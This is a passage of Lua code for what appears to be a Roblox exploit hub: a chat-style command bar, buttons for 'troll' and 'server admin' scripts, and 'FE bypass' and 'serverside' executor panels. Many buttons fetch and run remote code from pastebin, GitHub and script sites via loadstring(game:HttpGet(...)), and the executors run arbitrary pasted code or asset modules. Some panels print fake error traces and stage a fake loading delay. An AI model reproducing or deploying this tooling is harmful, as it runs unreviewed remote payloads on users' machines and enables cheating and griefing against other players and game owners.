ScrollingFrame.Size = UDim2.new(1, 0, 0.9, 0)
ScrollingFrame.Position = UDim2.new(0, 0, 0.1, 0)
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame.BorderSizePixel = 1
ScrollingFrame.Parent = Cmds
Instance.new("UIListLayout", ScrollingFrame)

ScrollingFrame.BackgroundTransparency = 1 

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(0.95, 0, 0, 0)
close.BackgroundColor3 = Color3.new(0, 0, 0)
close.BorderColor3 = Color3.new(0, 0, 0)
close.BorderSizePixel = 1
close.Text = "X"
close.BackgroundTransparency = 1 
close.TextColor3 = Color3.new(255, 0, 0)
close.Font = Enum.Font.Code
close.Parent = Lulsz
close.TextScaled = true
close.MouseButton1Click:Connect(function()
	Cmds.Visible = false
end)

local function AddCommand(name)
local LOOL = Instance.new("TextLabel")
LOOL.Size = UDim2.new(1, 0, 0.03, 0)
LOOL.Position = UDim2.new(0.5, 0, 0.5, 0)
LOOL.BackgroundColor3 = Color3.new(0, 0, 0)
LOOL.BorderColor3 = Color3.new(0, 0, 0)
LOOL.BorderSizePixel = 1
LOOL.Text = "Command : "..name.." | AKA : "..name
LOOL.BackgroundTransparency = 1 
LOOL.TextColor3 = Color3.new(255, 255, 255)
LOOL.Font = Enum.Font.Arial
LOOL.Parent = ScrollingFrame
LOOL.TextSize = 15
LOOL.TextXAlignment = "Left"
end

AddCommand("rainPart")
AddCommand("boom me")
AddCommand("reset me")
AddCommand("give me <gear>")
AddCommand("sit me")
AddCommand("kill me")
AddCommand("r6 me")
AddCommand("grounded me")
AddCommand("freeze me")
AddCommand("unfreeze me")
AddCommand("Cmds")
AddCommand("ff me")
AddCommand("Shutdown")

local Property = Instance.new("Frame")
Property.Size = UDim2.new(1, 0, 0.04, 0)
Property.Position = UDim2.new(0, 0, -0.1, 0)
Property.BackgroundColor3 = Color3.new(0, 0, 0)
Property.BorderColor3 = Color3.new(0, 0, 0)
Property.BorderSizePixel = 1
Property.BackgroundTransparency = 0.5 
Property.Parent = gui

local CmdBar = Instance.new("TextBox")
CmdBar.Size = UDim2.new(1, 0, 0.5, 0)
CmdBar.Position = UDim2.new(0, 0, 0.27, 0)
CmdBar.BackgroundColor3 = Color3.new(0, 0, 0)
CmdBar.BorderColor3 = Color3.new(0, 0, 0)
CmdBar.BorderSizePixel = 1
CmdBar.Text = ""
CmdBar.TextColor3 = Color3.new(1, 1, 1)
CmdBar.BackgroundTransparency = 0.5
CmdBar.Font = Enum.Font.Code
CmdBar.TextSize = 13
CmdBar.Parent = Property
CmdBar.Focused:Connect(function()
	CmdBar.Text = Prefix
end)

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Size = UDim2.new(0, 90, 0, 90)
ImageLabel.Position = UDim2.new(0.9, 0, 0.79, 0)
ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
ImageLabel.ImageColor3 = Color3.new(1, 1, 1)
ImageLabel.Image = "rbxassetid://123852508876370"
ImageLabel.ImageTransparency = 0
ImageLabel.Parent = gui
ImageLabel.Active = true

ImageLabel.BackgroundTransparency = 1 

local walkspeed = CmdBar.Text

CmdBar.FocusLost:Connect(function()
	if CmdBar.Text == Prefix.."boom me" then
		local exp = Instance.new("Explosion", workspace)
		exp.BlastPressure = 10000000000
		exp.BlastRadius = 10000000000
		exp.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
	elseif CmdBar.Text == Prefix.."kill me" then
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	elseif CmdBar.Text == Prefix.."sit me" then
		game.Players.LocalPlayer.Character.Humanoid.Sit = true
	elseif CmdBar.Text == Prefix.."give me bomb" then
--Service
local Plr = game.Players.LocalPlayer
local Rad = 19

--Tool
local Tool = Instance.new("Tool", Plr.Backpack)
Tool.ToolTip = "Bomb Tick Tock KABOOM! [Delay 5 Sec]"
Tool.Name = "Bomb"
Instance.new("ModuleScript", Tool)

local Hand = Instance.new("Part", Tool)
Hand.Shape = "Ball"
Hand.Color = Color3.new(0, 0, 0)
Hand.Size = Vector3.new(2, 2, 2)
Hand.Name = "Handle"

Tool.Activated:Connect(function()
   local Part = Instance.new("Part", workspace)
   Part.Size = Vector3.new(3, 3, 3)
   Part.Shape = "Ball"
   Part.Color = Color3.new(0, 0, 0)
   Part.TopSurface = "Smooth"
   Part.CFrame = Plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 4, -3)
   Part.BottomSurface = "Smooth"
   for V = 1, 5 do
   task.wait(0.4)
   Part.Color = Color3.new(1, 0, 0)
   task.wait(0.4)
   Part.Color = Color3.new(0, 0, 0)
  end
  local exp = Instance.new("Explosion", workspace)
  exp.BlastRadius *= Rad
  exp.BlastPressure *= Rad
  exp.Position = Part.Position
  exp.DestroyJointRadiusPercent = 100
  local Part2 = Instance.new("Part", workspace)
  Part2.Size = Vector3.new(Rad * 4, Rad * 4, Rad * 4)
  Part2.Position = Part.Position
  Part2.TopSurface = "Smooth"
  Part2.Anchored = true
  Part2.CanCollide = false
  Part2.Material = "Neon"
  Part2.BottomSurface = "Smooth"
  Part2.Color = Color3.new(0, 1, 0)
  Part2.Shape = "Ball"
  Part:Destroy()
  for B = 1, 10 do
   task.wait()
   Part2.Transparency += 0.1
  end
  Part2:Destroy()
end) 
	elseif CmdBar.Text == Prefix.."r6 me" then
		loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
	elseif CmdBar.Text == Prefix.."grounded me" then
		game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
	elseif CmdBar.Text == Prefix.."reset me" then
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	elseif CmdBar.Text == Prefix.."rainPart" then
for i = 1, math.random(1, 230) do
local Plr = game.Players.LocalPlayer
local Char = Plr.Character

local Part = Instance.new("Part", workspace)
Part.Size = Vector3.new(math.random(1, 60), math.random(1, 60), math.random(1, 60))
Part.Material = "Neon"
Part.Shape = "Ball"
Part.Position = Char.HumanoidRootPart.Position + Vector3.new(math.random(1, 50), 350, math.random(1, 50))
task.wait()
local Exp = Instance.new("Explosion", Part)
Exp.Position = Part.Position
Part.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
Smoke.Size = math.random(1, 100)
task.wait()
end
	elseif CmdBar.Text == Prefix.."freeze me" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
	elseif CmdBar.Text == Prefix.."unfreeze me" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
	elseif CmdBar.Text == Prefix.."cmds" then
		Cmds.Visible = true
	elseif CmdBar.Text == Prefix.."ff me" then
		Instance.new("ForceField", game.Players.LocalPlayer.Character)
	elseif CmdBar.Text == "shutdown" then
		game.Players.LocalPlayer:Kick()
     end
end)
end)
AddButton(SPage2, "Patrick", X2Y2)
AddButton(SPage2, "Bird Wing", X3Y2, function()
loadstring(game:HttpGet("https://pastebin.com/raw/zCypYHjJ", true))()
end)
AddButton(SPage2, "Dupstep Gun", X4Y2)
AddButton(SPage2, "Private gui by Sheldon.Lua", X1Y3)
AddButton(SPage2, "Ultima Executor(EXECUTOR ON TOP)", X2Y3)
AddButton(SPage2, "Ultimate Troll Gui by TheProPk5", X3Y3)
AddButton(SPage2, "Dearsister Gun", X4Y3)
AddButton(SPage2, "Server Admin", X1Y4, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/crytasl/refs/heads/main/serveradmin.lua"))()
end)
AddButton(SPage2, "Goner", X2Y4, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Goner-47954"))()
end)
AddButton(SPage2, "Baldi", X3Y4, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Baldi%20Script"))()
end)
AddButton(SPage2, "Baldi's Basic Game Map", X4Y4)
AddButton(SPage2, "IMDAVIN Project", X1Y5)
AddButton(SPage2, "HD Admin Ranker", X2Y5, function()
loadstring(game:HttpGet("https://pastebin.com/raw/PHG8Skj0"))()
end)
AddButton(SPage2, "ELLMODZ Administration Gui", X3Y5, function()
local m = Instance.new("Message", workspace)
m.Text = "Hello and welcome to this Administration Panel, to Continue use\n Enter a Passphare before you Start\nthe pass is : fe bypass"
wait(7)
m:Destroy()

local name = "ELLMODZ Administration Requirements"

if game.CoreGui:FindFirstChild(name) then
	game.CoreGui:FindFirstChild(name):Destroy()
end

local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = name
gui.ResetOnSpawn = false

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 850, 0, 450)
Main.Position = UDim2.new(0, 0, 0, 0)
Main.BackgroundColor3 = Color3.new(1, 1, 1)
Main.BorderColor3 = Color3.new(0, 0, 0)
Main.BorderSizePixel = 1
Main.BackgroundTransparency = 0 
Main.Parent = gui
Main.Visible = false

local function EERUFD_fake_script() -- mainpage.Dragify 
    local script = Instance.new('LocalScript', Main)
 
    local UserInputService = game:GetService("UserInputService")
    
    local gui = script.Parent
    
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
    
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end
coroutine.wrap(EERUFD_fake_script)()

local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(1, 0, 0.05, 0)
TextLabel.Position = UDim2.new(0, 0, 0, 0)
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 1
TextLabel.Text = "ELLMODZ Administrator Panel"
TextLabel.BackgroundTransparency = 0 
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Parent = Main
TextLabel.TextScaled = true

local Executor = Instance.new("TextButton")
Executor.Size = UDim2.new(0.5, 0, 0.05, 0)
Executor.Position = UDim2.new(0, 0, 0.05, 0)
Executor.BackgroundColor3 = Color3.new(1, 1, 1)
Executor.BorderColor3 = Color3.new(0, 0, 0)
Executor.BorderSizePixel = 1
Executor.Text = "Executor"
Executor.BackgroundTransparency = 0 
Executor.TextColor3 = Color3.new(0, 0, 0)
Executor.Font = Enum.Font.Gotham
Executor.Parent = Main
Executor.TextScaled = true
Executor.MouseEnter:Connect(function()
Executor.BackgroundColor3 = Color3.new(0, 0, 0)
Executor.TextColor3 = Color3.new(1, 1, 1)
end)
Executor.MouseLeave:Connect(function()
Executor.BackgroundColor3 = Color3.new(1, 1, 1)
Executor.TextColor3 = Color3.new(0, 0, 0)
end)

local Admin = Instance.new("TextButton")
Admin.Size = UDim2.new(0.5, 0, 0.05, 0)
Admin.Position = UDim2.new(0.5, 0, 0.05, 0)
Admin.BackgroundColor3 = Color3.new(1, 1, 1)
Admin.BorderColor3 = Color3.new(0, 0, 0)
Admin.BorderSizePixel = 1
Admin.Text = "Admin Panel"
Admin.BackgroundTransparency = 0 
Admin.TextColor3 = Color3.new(0, 0, 0)
Admin.Font = Enum.Font.Gotham
Admin.Parent = Main
Admin.TextScaled = true
Admin.MouseEnter:Connect(function()
Admin.BackgroundColor3 = Color3.new(0, 0, 0)
Admin.TextColor3 = Color3.new(1, 1, 1)
end)
Admin.MouseLeave:Connect(function()
Admin.BackgroundColor3 = Color3.new(1, 1, 1)
Admin.TextColor3 = Color3.new(0, 0, 0)
end)

local ExeP = Instance.new("Frame")
ExeP.Size = UDim2.new(1, 0, 0.9, 0)
ExeP.Position = UDim2.new(0, 0, 0.1, 0)
ExeP.BackgroundColor3 = Color3.new(1, 1, 1)
ExeP.BorderColor3 = Color3.new(0, 0, 0)
ExeP.BorderSizePixel = 1
ExeP.BackgroundTransparency = 0 
ExeP.Parent = Main

local Input = Instance.new("TextBox")
Input.Size = UDim2.new(0.7, 0, 0.98, 0)
Input.Position = UDim2.new(0.005, 0, 0.01, 0)
Input.BackgroundColor3 = Color3.new(1, 1, 1)
Input.BorderColor3 = Color3.new(0, 0, 0)
Input.BorderSizePixel = 1
Input.Text = ""
Input.PlaceholderText = "Stygiant of FilteringEnabled Bypass made by U53RDV_7283 with ELLMODZ API"
Input.TextColor3 = Color3.new(0, 0, 0)
Input.BackgroundTransparency = 0
Input.Font = Enum.Font.Code
Input.TextSize = 15
Input.ClearTextOnFocus = false
Input.MultiLine = true
Input.Parent = ExeP
Input.TextWrap = true
Input.TextXAlignment = "Left"
Input.TextYAlignment = "Top"

local Exe = Instance.new("TextButton")
Exe.Size = UDim2.new(0.28, 0, 0.2, 0)
Exe.Position = UDim2.new(0.71, 0, 0.01, 0)
Exe.BackgroundColor3 = Color3.new(1, 1, 1)
Exe.BorderColor3 = Color3.new(0, 0, 0)
Exe.BorderSizePixel = 1
Exe.Text = "Execute"
Exe.BackgroundTransparency = 0 
Exe.TextColor3 = Color3.new(0, 0, 0)
Exe.Font = Enum.Font.Gotham
Exe.Parent = ExeP
Exe.TextSize  = 40
Exe.MouseEnter:Connect(function()
Exe.BackgroundColor3 = Color3.new(0, 0, 0)
Exe.TextColor3 = Color3.new(1, 1, 1)
end)
Exe.MouseLeave:Connect(function()
Exe.BackgroundColor3 = Color3.new(1, 1, 1)
Exe.TextColor3 = Color3.new(0, 0, 0)
end)
Exe.MouseButton1Click:Connect(function()
	local scriptText = Input.Text
		local assetId = scriptText:match("require%s*%(?%s*(%d+)%s*%)?")
	
		if assetId then
			local success, result = pcall(function()
				local objects = game:GetObjects("rbxassetid://" .. assetId)
				local obj = objects[1]
				if obj then
				obj.Parent = game.Players.LocalPlayer.PlayerGui
					if obj:IsA("ModuleScript") then
					local Clo = obj:Clone()
					Clo.Parent = workspace
					local modSuccess, modResult = pcall(function()
						return require(obj)
					end)
					if not modSuccess then
						warn("Error requiring module:", modResult)
					end
				end
			end
		end)
		if not success then
			warn("Error loading asset:", result)
		end
	else
		warn("Invalid require() syntax.\n    CallStack : \n Requiring asset "..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." . \n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by ")
	end
end)

local Cle = Instance.new("TextButton")
Cle.Size = UDim2.new(0.28, 0, 0.2, 0)
Cle.Position = UDim2.new(0.71, 0, 0.22, 0)
Cle.BackgroundColor3 = Color3.new(1, 1, 1)
Cle.BorderColor3 = Color3.new(0, 0, 0)
Cle.BorderSizePixel = 1
Cle.Text = "Clear"
Cle.BackgroundTransparency = 0 
Cle.TextColor3 = Color3.new(0, 0, 0)
Cle.Font = Enum.Font.Gotham
Cle.Parent = ExeP
Cle.TextSize = 40
Cle.MouseEnter:Connect(function()
Cle.BackgroundColor3 = Color3.new(0, 0, 0)
Cle.TextColor3 = Color3.new(1, 1, 1)
end)
Cle.MouseLeave:Connect(function()
Cle.BackgroundColor3 = Color3.new(1, 1, 1)
Cle.TextColor3 = Color3.new(0, 0, 0)
end)
Cle.MouseButton1Click:Connect(function()
Input.Text = ""
end)

local Load = Instance.new("TextButton")
Load.Size = UDim2.new(0.28, 0, 0.2, 0)
Load.Position = UDim2.new(0.71, 0, 0.43, 0)
Load.BackgroundColor3 = Color3.new(1, 1, 1)
Load.BorderColor3 = Color3.new(0, 0, 0)
Load.BorderSizePixel = 1
Load.Text = "Load"
Load.BackgroundTransparency = 0 
Load.TextColor3 = Color3.new(0, 0, 0)
Load.Font = Enum.Font.Gotham
Load.Parent = ExeP
Load.TextSize = 40
Load.MouseEnter:Connect(function()
Load.BackgroundColor3 = Color3.new(0, 0, 0)
Load.TextColor3 = Color3.new(1, 1, 1)
end)
Load.MouseLeave:Connect(function()
Load.BackgroundColor3 = Color3.new(1, 1, 1)
Load.TextColor3 = Color3.new(0, 0, 0)
end)





local Key = Instance.new("Frame")
Key.Size = UDim2.new(0, 230, 0, 120)
Key.Position = UDim2.new(0.35, 0, 0.35, 0)
Key.BackgroundColor3 = Color3.new(1, 1, 1)
Key.BorderColor3 = Color3.new(0, 0, 0)
Key.BorderSizePixel = 1
Key.BackgroundTransparency = 0 
Key.Parent = gui

local Pass = Instance.new("TextBox")
Pass.Size = UDim2.new(0.8, 0, 0.2, 0)
Pass.Position = UDim2.new(0.1, 0, 0.1, 0)
Pass.BackgroundColor3 = Color3.new(0, 0, 0)
Pass.BorderColor3 = Color3.new(0, 0, 0)
Pass.BorderSizePixel = 1
Pass.Text = ""
Pass.PlaceholderText = "Enter Password here"
Pass.TextColor3 = Color3.new(255, 1, 255)
Pass.BackgroundTransparency = 0
Pass.Font = Enum.Font.Code
Pass.TextSize = 15
Pass.Parent = Key

local Sumbit = Instance.new("TextButton")
Sumbit.Size = UDim2.new(0, 185, 0, 40)
Sumbit.Position = UDim2.new(0.1, 0, 0.4, 0)
Sumbit.BackgroundColor3 = Color3.new(0, 0, 0)
Sumbit.BorderColor3 = Color3.new(0, 0, 0)
Sumbit.BorderSizePixel = 1
Sumbit.Text = "Sumbit"
Sumbit.TextScaled = true
Sumbit.BackgroundTransparency = 0 
Sumbit.TextColor3 = Color3.new(255, 255, 255)
Sumbit.Font = Enum.Font.Gotham
Sumbit.Parent = Key
Sumbit.MouseButton1Click:Connect(function() 
if Pass.Text == "fe bypass" then
Pass.Text = "Key Correct!"
wait(2)
Pass.Text = "Please Wait..."
wait(math.random(0, 10))
for i = 1, 360 do
warn("Attempt to set Module")
end
Key:Destroy()
wait(0.1)
Main.Visible = true
else
Pass.Text = ""
Pass.PlaceholderText = "Wrong Pass"
wait(3)
Pass.PlaceholderText = "Enter Password here"
end
end)

local function HXRD_fake_script() -- passpage.Dragify 
    local script = Instance.new('LocalScript', Key)
 
    local UserInputService = game:GetService("UserInputService")
    
    local gui = script.Parent
    
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
    
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end
coroutine.wrap(HXRD_fake_script)()
end)
AddButton(SPage2, "Green Tank", X4Y5, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/Green%20Tank.txt"))()
end)
AddButton(SPage2, "Ro-Xploit 6.0", X1Y6)
AddButton(SPage2, "Neutron SS", X2Y6, function()
wait(1)
local gui = Instance.new("ScreenGui")
gui.Name = "NeutronSS"
gui.Parent = game.Players.LocalPlayer.PlayerGui
gui.ResetOnSpawn = false

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 400, 0, 270)
Main.Position = UDim2.new(0, 0, 0, 0)
Main.BackgroundColor3 = Color3.new(0, 0, 0)
Main.BorderColor3 = Color3.new(1, 1, 1)
Main.BorderSizePixel = 2
Main.Active = true
Main.BackgroundTransparency = 0.5 
Main.Draggable = true
Main.Parent = gui
Main.Name = "Main"

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 20)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.new(0, 0, 0)
Title.BorderColor3 = Color3.new(0, 0, 0)
Title.BorderSizePixel = 1
Title.Text = "Neutron Serverside"
Title.BackgroundTransparency = 1 
Title.TextColor3 = Color3.new(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.Parent = Main
Title.Name = "Title"
Title.TextSize = 20

local BoxCode = Instance.new("ScrollingFrame")
BoxCode.Size = UDim2.new(0, 380, 0, 170)
BoxCode.Position = UDim2.new(0, 10, 0, 53)
BoxCode.BackgroundColor3 = Color3.new(0, 0, 0)
BoxCode.BorderColor3 = Color3.new(1, 1, 1)
BoxCode.BorderSizePixel = 2
BoxCode.Parent = Main
BoxCode.ScrollBarThickness = 0
BoxCode.ScrollingDirection = "Y"
BoxCode.BackgroundTransparency = 0 
BoxCode.Name = "BoxCode"

local Line = Instance.new("TextLabel")
Line.Size = UDim2.new(0, 30, 1, 0)
Line.Position = UDim2.new(0, 0, 0, 0)
Line.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Line.BorderColor3 = Color3.new(0, 0, 0)
Line.BorderSizePixel = 0
Line.Text = "1"
Line.BackgroundTransparency = 0 
Line.TextColor3 = Color3.new(255, 255, 255)
Line.Font = Enum.Font.Code
Line.Parent = BoxCode
Line.TextYAlignment = "Top"
Line.TextSize = 15
Line.Name = "Line"

local Input = Instance.new("TextBox")
Input.Size = UDim2.new(1, 0, 1, 0)
Input.Position = UDim2.new(0, 31, 0, 0)
Input.BackgroundColor3 = Color3.new(0, 0, 0)
Input.BorderColor3 = Color3.new(0, 0, 0)
Input.BorderSizePixel = 1
Input.Text = ""
Input.TextColor3 = Color3.new(255, 1, 255)
Input.BackgroundTransparency = 1
Input.Font = Enum.Font.Code
Input.TextSize = 15
Input.Parent = BoxCode
Input.TextXAlignment = "Left"
Input.TextYAlignment = "Top"
Input.ClearTextOnFocus = false
Input.MultiLine = true
Input.PlaceholderText = "made by FRP20000"
Input:GetPropertyChangedSignal("Text"):Connect(function()
    local lines = Input.Text:split("\n")
    local lineText = ""
    for i = 1, #lines do
        lineText = lineText .. tostring(i) .. "\n"
    end
    Line.Text = lineText

    BoxCode.CanvasSize = UDim2.new(0, #lines * 20, 0, #lines * 20)
end)
Instance.new("LocalScript", Input)

local ExeSS = Instance.new("TextButton")
ExeSS.Size = UDim2.new(0, 120, 0, 20)
ExeSS.Position = UDim2.new(0, 270, 0, 25)
ExeSS.BackgroundColor3 = Color3.new(0, 0, 0)
ExeSS.BorderColor3 = Color3.new(1, 1, 1)
ExeSS.BorderSizePixel = 2
ExeSS.Text = "Execute SS"
ExeSS.BackgroundTransparency = 0 
ExeSS.TextColor3 = Color3.new(255, 255, 255)
ExeSS.Font = Enum.Font.GothamBold
ExeSS.Parent = Main
ExeSS.TextSize = 15
local function COROTINE()
	local script = Instance.new("LocalScript", ExeSS)
	
	ExeSS.MouseButton1Click:Connect(function()
	local scriptText = Input.Text
		local assetId = scriptText:match("require%s*%(?%s*(%d+)%s*%)?")
	
		if assetId then
			local success, result = pcall(function()
				local objects = game:GetObjects("rbxassetid://" .. assetId)
				local obj = objects[1]
				if obj then
				obj.Parent = game.Players.LocalPlayer.PlayerGui
				obj:Clone().Parent = workspace
					if obj:IsA("ModuleScript") then
					local modSuccess, modResult = pcall(function()
						return require(obj)
					end)
					if not modSuccess then
						warn("Error requiring module:", modResult)
					end
				end
			end
		end)
		if not success then
			warn("Error loading asset:", result)
		end
	else
		warn("Invalid require() syntax.\n    CallStack : \n Requiring asset "..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." . \n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by ")
	end
	end)
end
coroutine.wrap(COROTINE)()
ExeSS.MouseButton1Click:Connect(function()
	loadstring(Input.Text)()
end)

local Usn = Instance.new("TextButton")
Usn.Size = UDim2.new(0, 120, 0, 20)
Usn.Position = UDim2.new(0, 10, 0, 25)
Usn.BackgroundColor3 = Color3.new(0, 0, 0)
Usn.BorderColor3 = Color3.new(1, 1, 1)
Usn.BorderSizePixel = 2
Usn.Text = "Auto Fill Username"
Usn.BackgroundTransparency = 0 
Usn.TextColor3 = Color3.new(255, 255, 255)
Usn.Font = Enum.Font.GothamBold
Usn.Parent = Main
Usn.TextSize = 13
local function COROTINE()
	local script = Instance.new("LocalScript", Usn)
	
	script.Parent.MouseButton1Click:Connect(function()
		Input.Text = game.Players.LocalPlayer.Name
	end)
end
coroutine.wrap(COROTINE)()

local Execute = Instance.new("TextButton")
Execute.Size = UDim2.new(0, 80, 0, 32)
Execute.Position = UDim2.new(0, 10, 0, 230)
Execute.BackgroundColor3 = Color3.new(0, 0, 0)
Execute.BorderColor3 = Color3.new(1, 1, 1)
Execute.BorderSizePixel = 2
Execute.Text = "Execute"
Execute.BackgroundTransparency = 0 
Execute.TextColor3 = Color3.new(255, 255, 255)
Execute.Font = Enum.Font.GothamBold
Execute.Parent = Main
Execute.TextSize = 15
local function COROTINE()
	local script = Instance.new("LocalScript", Execute)
	
	Execute.MouseButton1Click:Connect(function()
		assert(loadstring(Input.Text)())()
	end)
end
coroutine.wrap(COROTINE)()

local Clear = Instance.new("TextButton")
Clear.Size = UDim2.new(0, 80, 0, 32)
Clear.Position = UDim2.new(0, 100, 0, 230)
Clear.BackgroundColor3 = Color3.new(0, 0, 0)
Clear.BorderColor3 = Color3.new(1, 1, 1)
Clear.BorderSizePixel = 2
Clear.Text = "Clear"
Clear.BackgroundTransparency = 0 
Clear.TextColor3 = Color3.new(255, 255, 255)
Clear.Font = Enum.Font.GothamBold
Clear.Parent = Main
Clear.TextSize = 15
local function COROTINE()
	local script = Instance.new("LocalScript", Clear)
	
	Clear.MouseButton1Click:Connect(function()
		Input.Text = ""
	end)
end
coroutine.wrap(COROTINE)()

local Reset = Instance.new("TextButton")
Reset.Size = UDim2.new(0, 80, 0, 32)
Reset.Position = UDim2.new(0, 190, 0, 230)
Reset.BackgroundColor3 = Color3.new(0, 0, 0)
Reset.BorderColor3 = Color3.new(1, 1, 1)
Reset.BorderSizePixel = 2
Reset.Text = "Reset"
Reset.BackgroundTransparency = 0 
Reset.TextColor3 = Color3.new(255, 255, 255)
Reset.Font = Enum.Font.GothamBold
Reset.Parent = Main
Reset.TextSize = 15
local function COROTINE()
	local script = Instance.new("LocalScript", Reset)
	
	Reset.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
	end)
end
coroutine.wrap(COROTINE)()

local R6 = Instance.new("TextButton")
R6.Size = UDim2.new(0, 110, 0, 32)
R6.Position = UDim2.new(0, 280, 0, 230)
R6.BackgroundColor3 = Color3.new(0, 0, 0)
R6.BorderColor3 = Color3.new(1, 1, 1)
R6.BorderSizePixel = 2
R6.Text = "Body type Switch"
R6.BackgroundTransparency = 0 
R6.TextColor3 = Color3.new(255, 255, 255)
R6.Font = Enum.Font.GothamBold
R6.Parent = Main
R6.TextScaled = true
local function COROTINE()
	local script = Instance.new("LocalScript", R6)
	
	R6.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/E00KIDD-r6-by-me/refs/heads/main/R6%20Real"))()
	end)
end
